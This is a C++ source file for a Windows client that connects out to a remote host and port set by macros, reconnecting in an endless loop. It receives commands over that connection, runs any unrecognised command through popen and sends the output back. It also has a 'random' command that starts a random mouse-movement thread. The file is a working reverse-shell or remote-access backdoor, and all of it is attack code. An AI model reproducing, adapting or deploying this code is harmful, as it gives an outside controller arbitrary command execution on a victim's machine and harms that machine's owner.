#include <string.h>
#include "CommandListener.h"
#include "RandomMouse.h"

using namespace std;

CommandListener::CommandListener()
{
  setupSocket();
}

void CommandListener::tryToConnect()
{
  int err = -1;
  while(err < 0) {
    err = connect(sConnect, (SOCKADDR*)&addr, sizeof(addr));
  }
}

void CommandListener::startListening()
{
  tryToConnect();
  while (1) {
    memset(message, 0, sizeof(message));
    r = recv(sConnect, message, sizeof(message), 0);
    if (r < 0) {
      closesocket(sConnect);
      setupSocket();
      tryToConnect();
    } else {
      // cout << message << endl;
      handleCommand(message);
    }
  }
  getchar();
}

void CommandListener::setupSocket()
{
  //Winsock-DLL
  WSAData wsaData;
  WORD DLLVersion;
  DLLVersion = MAKEWORD(2,1);
  r = WSAStartup(DLLVersion, &wsaData);
  // Socket configuration
  sConnect = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
  addr.sin_addr.s_addr = inet_addr(IP_ADDR);
  addr.sin_family = AF_INET;
  addr.sin_port = htons(PORT_NUM);
}

void CommandListener::handleCommand(const char* cmd)
{
  if(strcmp(cmd, "stop") == 0)
  {
    StopAllThreads sat;
    sat();
    // TO-DO exit the program
  }
  else if(strcmp(cmd, "CHECK_STATUS") == 0)
  {
    char done[30] = "CONNECTED";
    send(sConnect,done,(int)strlen(done),0);
    return;
  }
  else if(strcmp(cmd, "random") == 0)
  {
    RandomMouse rdm;
    this->tp.setThread(&rdm);
  }
  else
  {
    string str = executeCommand(message);
    char *sendbuf = &str[0];
    send(sConnect,sendbuf,(int)strlen(sendbuf),0);
  }
  char done[30] = "Command executed.\n";
  send(sConnect,done,(int)strlen(done),0);
}

string CommandListener::executeCommand(const char* cmd)
{
  array<char, 128> buffer;
  string result;
  unique_ptr<FILE, decltype(&pclose)> pipe(popen(cmd, "r"), pclose);
  if (!pipe) {
    throw runtime_error("popen() failed!");
  }
  while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
    result += buffer.data();
  }
  return result;
}